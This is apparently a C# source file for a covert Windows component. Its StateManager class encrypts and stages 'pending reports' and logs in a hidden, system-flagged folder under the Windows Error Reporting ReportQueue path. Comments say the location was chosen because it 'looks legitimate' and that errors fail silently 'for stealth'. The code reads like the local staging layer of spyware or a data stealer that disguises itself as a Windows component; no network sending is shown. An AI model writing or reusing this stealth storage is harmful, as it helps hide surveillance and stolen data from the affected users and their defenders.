using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace WinSvc.Core;

public class StateManager
{
    private readonly string _stateDir; //Logs stored encrypted in %ProgramData%\Microsoft\Windows\WER\ReportQueue (looks like Windows Error Reporting)
    private readonly byte[] _key;

    public StateManager()
    {
        // Hidden in system cache that looks legitimate
        _stateDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "Microsoft",
            "Windows",
            "WER",
            "ReportQueue"
        );

        EnsureDirectory();
        _key = DeriveKey();
    }

    private void EnsureDirectory()
    {
        if (!Directory.Exists(_stateDir))
        {
            Directory.CreateDirectory(_stateDir);
            File.SetAttributes(_stateDir, FileAttributes.Hidden | FileAttributes.System);
        }
    }

    private byte[] DeriveKey()
    {
        // Derive key from machine-specific data
        var machineId = Environment.MachineName + Environment.UserName;
        using (var sha = SHA256.Create())
        {
            return sha.ComputeHash(Encoding.UTF8.GetBytes(machineId));
        }
    }

    public void SavePendingReport(string content)
    {
        try
        {
            var fileName = $"{DateTime.UtcNow:yyyyMMddHHmmss}_{Guid.NewGuid():N}.tmp";
            var filePath = Path.Combine(_stateDir, fileName);
            var encrypted = Encrypt(content);
            File.WriteAllBytes(filePath, encrypted);
        }
        catch { /* Silent fail for stealth */ }
    }

    public void AppendLog(LogEntry entry)
    {
        try
        {
            var fileName = "syslog.tmp";
            var filePath = Path.Combine(_stateDir, fileName);
            var logLine = $"{entry.Timestamp:yyyy-MM-dd HH:mm:ss}|{entry.Level}|{entry.Message}";
            if (!string.IsNullOrEmpty(entry.Exception))
                logLine += $"|{entry.Exception.Replace("\n", " ")}";

            var encrypted = Encrypt(logLine + "\n");

            if (File.Exists(filePath))
            {
                var existing = File.ReadAllBytes(filePath);
                File.WriteAllBytes(filePath, existing.Concat(encrypted).ToArray());
            }
            else
            {
                File.WriteAllBytes(filePath, encrypted);
            }
        }
        catch { /* Silent fail */ }
    }

    public string[] GetPendingReports()
    {
        try
        {
            if (!Directory.Exists(_stateDir))
                return Array.Empty<string>();

            return Directory.GetFiles(_stateDir, "*.tmp")
                .Where(f => !Path.GetFileName(f).StartsWith("syslog"))
                .ToArray();
        }
        catch
        {
            return Array.Empty<string>();
        }
    }

    public string ReadPendingReport(string filePath)
    {
        try
        {
            var encrypted = File.ReadAllBytes(filePath);
            return Decrypt(encrypted);
        }
        catch
        {
            return null;
        }
    }

    public void DeletePendingReport(string filePath)
    {
        try
        {
            File.Delete(filePath);
        }
        catch { /* Silent fail */ }
    }

    public string GetAndClearLogs()
    {
        try
        {
            var fileName = "syslog.tmp";
            var filePath = Path.Combine(_stateDir, fileName);

            if (!File.Exists(filePath))
                return null;

            var encrypted = File.ReadAllBytes(filePath);
            File.Delete(filePath);
            return Decrypt(encrypted);
        }
        catch
        {
            return null;
        }
    }

    private byte[] Encrypt(string plainText)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = _key;
            aes.GenerateIV();

            using (var encryptor = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            {
                ms.Write(aes.IV, 0, aes.IV.Length);
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                using (var writer = new StreamWriter(cs))
                {
                    writer.Write(plainText);
                }
                return ms.ToArray();
            }
        }
    }

    private string Decrypt(byte[] cipherText)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = _key;

            var iv = new byte[16];
            Array.Copy(cipherText, 0, iv, 0, 16);
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(cipherText, 16, cipherText.Length - 16))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var reader = new StreamReader(cs))
            {
                return reader.ReadToEnd();
            }
        }
    }
}
